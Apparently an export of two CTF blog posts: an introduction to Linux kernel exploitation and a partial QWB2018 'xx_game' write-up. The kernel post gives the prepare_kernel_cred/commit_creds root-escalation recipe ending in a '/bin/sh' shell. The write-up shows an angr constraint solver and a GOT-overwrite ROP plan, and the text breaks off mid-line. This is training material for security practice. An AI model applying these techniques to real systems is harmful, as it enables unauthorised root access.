[{"title":"Introductions to Linux Kernel Pwn","url":"http://yoursite.com/2018/03/28/Introductions-to-Linux-Kernel-Pwn/","content":"<h1 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h1><p>Linux Kernel pwn is an item of CTF Pwn. Unlike we always solve the common problems with python, we usually do Kernel pwn with C. Since I’m just getting started with it, I want to write something down.</p>\n<h1 id=\"Analyse\"><a href=\"#Analyse\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h1><h2 id=\"Basic-Knowledge\"><a href=\"#Basic-Knowledge\" class=\"headerlink\" title=\"Basic Knowledge\"></a>Basic Knowledge</h2><p>User space to Kernel space</p>\n<ol>\n<li>Switching the GS segment register through swapgs, which is to swap the value of the GS register with the value of a specific position in order to save the GS value and use the value of this position as the GS value when the kernel executes.</li>\n<li><p>The top of the current stack (User space stack top) is recorded in the CPU exclusive variable area, and the top of the kernel stack recorded in the CPU exclusive area is placed in the rsp (esp).</p>\n</li>\n<li><p>By pushing each register value, the code is as follows:</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ENTRY(entry_SYSCALL_64)</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * Interrupts are off on entry.</span><br><span class=\"line\">\t * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,</span><br><span class=\"line\">\t * it is too small to ever cause noticeable irq latency.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tSWAPGS_UNSAFE_STACK</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * A hypervisor implementation might want to use a label</span><br><span class=\"line\">\t * after the swapgs, so that it can do the swapgs</span><br><span class=\"line\">\t * for the guest and jump here on syscall.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">GLOBAL(entry_SYSCALL_64_after_swapgs)</span><br><span class=\"line\"></span><br><span class=\"line\">\tmovq\t%rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class=\"line\">\tmovq\tPER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class=\"line\"></span><br><span class=\"line\">\tTRACE_IRQS_OFF</span><br><span class=\"line\"></span><br><span class=\"line\">\t/* Construct struct pt_regs on stack */</span><br><span class=\"line\">\tpushq\t$__USER_DS\t\t\t/* pt_regs-&gt;ss */</span><br><span class=\"line\">\tpushq\tPER_CPU_VAR(rsp_scratch)\t/* pt_regs-&gt;sp */</span><br><span class=\"line\">\tpushq\t%r11\t\t\t\t/* pt_regs-&gt;flags */</span><br><span class=\"line\">\tpushq\t$__USER_CS\t\t\t/* pt_regs-&gt;cs */</span><br><span class=\"line\">\tpushq\t%rcx\t\t\t\t/* pt_regs-&gt;ip */</span><br><span class=\"line\">\tpushq\t%rax\t\t\t\t/* pt_regs-&gt;orig_ax */</span><br><span class=\"line\">\tpushq\t%rdi\t\t\t\t/* pt_regs-&gt;di */</span><br><span class=\"line\">\tpushq\t%rsi\t\t\t\t/* pt_regs-&gt;si */</span><br><span class=\"line\">\tpushq\t%rdx\t\t\t\t/* pt_regs-&gt;dx */</span><br><span class=\"line\">\tpushq\t%rcx\t\t\t\t/* pt_regs-&gt;cx */</span><br><span class=\"line\">\tpushq\t$-ENOSYS\t\t\t/* pt_regs-&gt;ax */</span><br><span class=\"line\">\tpushq\t%r8\t\t\t\t/* pt_regs-&gt;r8 */</span><br><span class=\"line\">\tpushq\t%r9\t\t\t\t/* pt_regs-&gt;r9 */</span><br><span class=\"line\">\tpushq\t%r10\t\t\t\t/* pt_regs-&gt;r10 */</span><br><span class=\"line\">\tpushq\t%r11\t\t\t\t/* pt_regs-&gt;r11 */</span><br><span class=\"line\">\tsub\t$(6*8), %rsp\t\t\t/* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure>\n<p>Kernel space return to User space</p>\n<ol>\n<li>Restore GS value by swapgs.</li>\n<li>Restore to user space through sysretq or iretq for execution, if you use Iretq, you still need to give some information in the User space, such as CS value, eflags flag register value, user stack top position and so on.</li>\n</ol>\n<p>For example:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push $SS_USER_VALUE</span><br><span class=\"line\">push $USERLAND_STACK</span><br><span class=\"line\">push $USERLAND_EFLAGS</span><br><span class=\"line\">push $CS_USER_VALUE</span><br><span class=\"line\">push $USERLAND_FUNCTION_ADDRESS</span><br><span class=\"line\">swapgs</span><br><span class=\"line\">iretq</span><br></pre></td></tr></table></figure>\n<h2 id=\"File-struct\"><a href=\"#File-struct\" class=\"headerlink\" title=\"File struct\"></a>File struct</h2><p>In CTF, we always got these files</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">boot.sh -- a bash script to start Kernel (basically using qemu)</span><br><span class=\"line\">bzImage -- Kernel binary</span><br><span class=\"line\">rootfs.cpio -- an image of the root file, including .ko file, /etc, /bin, /sys, etc</span><br></pre></td></tr></table></figure>\n<p>In most cases, we need to analyse the .ko file, which is a linux Kernel module. By inserting the Kernel module into the Kernel, some driver code can be dynamically loaded to be responsible for interacting with the hardware, or provide some software functions at the Kernel layer. The Kernel module runs in the Kernel space and can interact with device files, such as /dev/. Many of the files in the directory are device files. The use of open and close functions is to open device files, close device files, etc. These functions are defined in the Kernel module, and then set in accordance with certain rules when loading, so through these functions you can call the appropriate set of functions in the Kernel module, and finally complete a series of operations in the Kernel to provide functionality for User space.</p>\n<h2 id=\"Mitigation\"><a href=\"#Mitigation\" class=\"headerlink\" title=\"Mitigation\"></a>Mitigation</h2><p>The Mitigations of Kernel space is almost like User space, such as aslr, canary, dep, etc. But there are some differences.</p>\n<p>In Kernel space there is a mitigation called SMEP, which is used to avoid hijacking the control flow from the Kernel space, making the control flow back to the User space, and execute the User space code as ring 0 to raise the power. When the SMEP is turned on, the CPU will stop executing User space code in ring 0. This is a CPU function that is managed by the CPU’s CR4 register and uses a bit to indicate whether SMEP protection is enabled. However, SMEP protection does not prevent direct access to data from User space, but simply prevents the execution of User-space code.</p>\n<p>SMAP is like SMEP, preventing ring 0 in Kernel from getting data from User space.</p>\n<p>Memory allocation is also required in the Kernel space. Unlike malloc in User space, Kernel uses kmalloc, which uses slab/slub distributors, now more common are slub allocators. This distributor is managed through a multi-level structure. First, there is the cache layer. The cache is a structure. The inside is managed by saving empty objects, partially using objects, and using objects completely. Objects refer to memory objects, that is will be allocated or a part of the Kernel space that is allocated. Kmalloc uses multiple caches, one cache for a set of memory objects of size two.</p>\n<p>The slab allocator strictly differentiates according to the cache. Different caches cannot be allocated on one page. The slub allocator is looser. If different caches are allocated the same size, they may be within one page. This point is very important, which The basic exploit will use.</p>\n<h1 id=\"Debug\"><a href=\"#Debug\" class=\"headerlink\" title=\"Debug\"></a>Debug</h1><p>First we need to unpack .cpio</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir initframs &amp;&amp; cp test.cpio initframs &amp;&amp; <span class=\"built_in\">cd</span> initframs</span><br><span class=\"line\">cpio -idmv &lt; test.cpio</span><br></pre></td></tr></table></figure>\n<p>Now, we can find .ko and load it to ida to analyse.</p>\n<p>Then we copy our exp to initframs and do</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find ./* | cpio -H newc -o &gt; test.cpio</span><br></pre></td></tr></table></figure>\n<p>After that, when we start Kernel, we will find exp in it.</p>\n<p>Start Kernel with ‘-s’ parameter, such as</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 \\</span><br><span class=\"line\">-m 256M \\</span><br><span class=\"line\">-Kernel ./bzImage \\</span><br><span class=\"line\">-initrd  ./core.cpio \\</span><br><span class=\"line\">-append <span class=\"string\">\"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\"</span> \\</span><br><span class=\"line\">-netdev User,id=t0, -device e1000,netdev=t0,id=nic0 \\</span><br><span class=\"line\">-nographic  \\</span><br><span class=\"line\">-s \\</span><br></pre></td></tr></table></figure>\n<p>Then we can debug Kernel in gdb</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target remote tcp::1234</span><br></pre></td></tr></table></figure>\n<p>We can use some useful command</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsmod -- list addresses of loaded modules</span><br><span class=\"line\">cat /proc/kallsyms -- get addresses of all symbols in Kernel</span><br></pre></td></tr></table></figure>\n<h1 id=\"Basic-Exploit\"><a href=\"#Basic-Exploit\" class=\"headerlink\" title=\"Basic Exploit\"></a>Basic Exploit</h1><p>Since the Kernel manages running processes, it keeps track of permissions. </p>\n<p>Conveniently, the Linux Kernel has a wrapper for updating process credentials.</p>\n<p><a href=\"https://elixir.bootlin.com/linux/v4.12.2/source\" target=\"_blank\" rel=\"noopener\">Linux Kernel source code</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> &#123;</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"comment\">/* Process credentials: */</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Tracer's credentials at attach: */</span></span><br><span class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>\t\t*<span class=\"title\">ptracer_cred</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Objective and real subjective task credentials (COW): */</span></span><br><span class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>\t\t*<span class=\"title\">real_cred</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>\t\t*<span class=\"title\">cred</span>;</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">struct cred *<span class=\"title\">prepare_kernel_cred</span><span class=\"params\">(struct task_struct *daemon)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> *<span class=\"title\">old</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> *<span class=\"title\">new</span>;</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">commit_creds</span><span class=\"params\">(struct cred *<span class=\"keyword\">new</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> *<span class=\"title\">task</span> = <span class=\"title\">current</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> *<span class=\"title\">old</span> = <span class=\"title\">task</span>-&gt;<span class=\"title\">real_cred</span>;</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Therefore, we could</p>\n<ol>\n<li>Create a root struct cred by calling prepare_kernel_cred(0)</li>\n<li>Call commit_creds(root cred *) to set the credential of the process to root</li>\n<li>swapgs &amp; iretq to User space to system(‘/bin/sh’)</li>\n</ol>\n","categories":["Pwn"],"tags":[]},{"title":"QWB2018 xx_game Write Up","url":"http://yoursite.com/2018/03/27/QWB2018-xx-game-Write-Up/","content":"<h1 id=\"Analyse\"><a href=\"#Analyse\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h1><p>It’s a game, which provides you a different base64 encoded string of binary when you connect the server each time. </p>\n<p>load the binary into ida.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">signed</span> __int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> a1, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> num; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  some_init();</span><br><span class=\"line\">  alarm(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  num = atoi(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> calc_vuln(num);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>It takes the second command line parameter as the input of the atoi to get an integer, which be taken by calc_vuln.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">signed</span> __int64 __<span class=\"function\">fastcall <span class=\"title\">calc_vuln</span><span class=\"params\">(<span class=\"keyword\">int</span> num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-2E4h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-2E0h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int8 *v4; <span class=\"comment\">// [rsp+2E8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = num;</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">unsigned</span> __int8 *)&amp;v2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (BYTE1(v2) + <span class=\"number\">21326</span>) * (<span class=\"number\">15391</span> % HIBYTE(num)) != <span class=\"number\">556894</span></span><br><span class=\"line\">    || v4[<span class=\"number\">2</span>] + <span class=\"number\">17401</span> + <span class=\"number\">13660</span> - v4[<span class=\"number\">1</span>] != <span class=\"number\">31186</span></span><br><span class=\"line\">    || <span class=\"number\">6019</span> / v4[<span class=\"number\">3</span>] * <span class=\"number\">7995</span> * v4[<span class=\"number\">2</span>] != <span class=\"number\">298037610</span></span><br><span class=\"line\">    || <span class=\"number\">29267</span> / v4[<span class=\"number\">1</span>] - (v4[<span class=\"number\">1</span>] + <span class=\"number\">65447</span>) != <span class=\"number\">-65226</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  seccomp_add();</span><br><span class=\"line\">  gets((__int64)&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>In the calc_vuln, there is a obviously stack overflow vulnerability with gets. But the num should pass some unkind calculations, or the function will return directly.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__<span class=\"function\">int64 <span class=\"title\">seccomp_add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 a1; <span class=\"comment\">// [rsp+78h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  a1 = seccomp_init(<span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !a1 )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">0L</span>L, <span class=\"number\">0L</span>L);<span class=\"comment\">//read</span></span><br><span class=\"line\">  seccomp_rule_add_exact(</span><br><span class=\"line\">    a1,</span><br><span class=\"line\">    <span class=\"number\">0x7FFF0000</span>LL,</span><br><span class=\"line\">    <span class=\"number\">1L</span>L,</span><br><span class=\"line\">    <span class=\"number\">3L</span>L,</span><br><span class=\"line\">    <span class=\"number\">0x400000000</span>LL,</span><br><span class=\"line\">    <span class=\"number\">1L</span>L,</span><br><span class=\"line\">    <span class=\"number\">0L</span>L,</span><br><span class=\"line\">    <span class=\"number\">0x400000001</span>LL,</span><br><span class=\"line\">    <span class=\"number\">0x602100</span>LL,</span><br><span class=\"line\">    <span class=\"number\">0L</span>L,</span><br><span class=\"line\">    <span class=\"number\">0x300000002</span>LL,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>LL,</span><br><span class=\"line\">    <span class=\"number\">0L</span>L);\t<span class=\"comment\">//write</span></span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">1L</span>L, <span class=\"number\">1L</span>L, <span class=\"number\">0x400000000</span>LL, <span class=\"number\">2L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">2L</span>L, <span class=\"number\">0L</span>L);<span class=\"comment\">//open</span></span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">60L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">231L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">3L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">15L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">12L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  seccomp_rule_add_exact(a1, <span class=\"number\">0x7FFF0000</span>LL, <span class=\"number\">5L</span>L, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)seccomp_load(a1) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    seccomp_release(a1);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> seccomp_release(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>In the seccomp_add, it restricts us from using syscall, for example we could use read, write, open .. but execve. Besides, it seems to restrain the addr of write ( Only 0x602100 ).</p>\n<p>The logic is simple and target is clear. Since the base64 encoded string are different each time, we cannot calculate the correct num just once. We need to get it automatically when we connect the server.</p>\n<h1 id=\"Using-Angr\"><a href=\"#Using-Angr\" class=\"headerlink\" title=\"Using Angr\"></a>Using Angr</h1><p><a href=\"http://angr.io\" target=\"_blank\" rel=\"noopener\">Angr</a> is a python framework for analyzing binaries. It combines both static and dynamic symbolic (“concolic”) analysis, making it applicable to a variety of tasks.</p>\n<p>First we load the binary as project</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = angr.Project(<span class=\"string\">'./xx_game'</span>,auto_load_libs=<span class=\"keyword\">False</span>)</span><br></pre></td></tr></table></figure>\n<p>Then we need to get a state, this time I choose the entry of calc_vuln (0x400BC5)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st = p.factory.blank_state(addr=<span class=\"number\">0x400BC5</span>)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400BC5 calc_vuln       proc near               ; CODE XREF: main+4D↓p</span><br><span class=\"line\">.text:0000000000400BC5</span><br><span class=\"line\">.text:0000000000400BC5 var_2E4         = dword ptr -2E4h</span><br><span class=\"line\">.text:0000000000400BC5 var_2E0         = byte ptr -2E0h</span><br><span class=\"line\">.text:0000000000400BC5 var_8           = qword ptr -8</span><br><span class=\"line\">.text:0000000000400BC5</span><br><span class=\"line\">.text:0000000000400BC5 ; __unwind &#123;</span><br><span class=\"line\">.text:0000000000400BC5                 push    rbp</span><br><span class=\"line\">.text:0000000000400BC6                 mov     rbp, rsp</span><br></pre></td></tr></table></figure>\n<p>Since the blank_state has many uninitialized data, we must initialise some data get the simulator of angr running.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st.regs.rbp = <span class=\"number\">0xffffffd800000</span></span><br><span class=\"line\">st.regs.rsp = <span class=\"number\">0xffffffe800000</span></span><br><span class=\"line\">num = claripy.BVS(<span class=\"string\">'num'</span>,<span class=\"number\">4</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">st.memory.store(st.regs.rbp<span class=\"number\">-0x100</span>,num)</span><br><span class=\"line\">st.regs.rdi = num</span><br></pre></td></tr></table></figure>\n<p>Set the rbp &amp; rsp to the addr, which is always writable in x86_64. Symbolize a num,set it to the parameter of this func (rdi) and store it.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sm = p.factory.simgr(st)</span><br><span class=\"line\">sm.explore()</span><br><span class=\"line\">res = sm.deadended[<span class=\"number\">0</span>].se.eval(num, cast_to=int)</span><br></pre></td></tr></table></figure>\n<p>Run the simulator and when it’s done, we could solve the symbol and got the num.</p>\n<h1 id=\"ROP\"><a href=\"#ROP\" class=\"headerlink\" title=\"ROP\"></a>ROP</h1><p>Since it does not import some useful function like read, write and open, we need to find an  int 0x80 or syscall.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/50i 0x00007efc53574200</span><br><span class=\"line\">   0x7efc53574200 &lt;alarm&gt;:\tmov    eax,0x25</span><br><span class=\"line\">   0x7efc53574205 &lt;alarm+5&gt;:\tsyscall </span><br><span class=\"line\">   0x7efc53574207 &lt;alarm+7&gt;:\tcmp    rax,0xfffffffffffff001</span><br><span class=\"line\">   0x7efc5357420d &lt;alarm+13&gt;:\tjae    0x7efc53574210 &lt;alarm+16&gt;</span><br><span class=\"line\">   0x7efc5357420f &lt;alarm+15&gt;:\tret    </span><br><span class=\"line\">   0x7efc53574210 &lt;alarm+16&gt;:\tmov    rcx,QWORD PTR [rip+0x2f7c61]        # 0x7efc5386be78</span><br><span class=\"line\">   0x7efc53574217 &lt;alarm+23&gt;:\tneg    eax</span><br><span class=\"line\">   0x7efc53574219 &lt;alarm+25&gt;:\tmov    DWORD PTR fs:[rcx],eax</span><br><span class=\"line\">   0x7efc5357421c &lt;alarm+28&gt;:\tor     rax,0xffffffffffffffff</span><br><span class=\"line\">   0x7efc53574220 &lt;alarm+32&gt;:\tret</span><br></pre></td></tr></table></figure>\n<p>Alarm+5 is a syscall, so we need to change got[‘alarm’].</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xchg byte ptr [rdi], dl 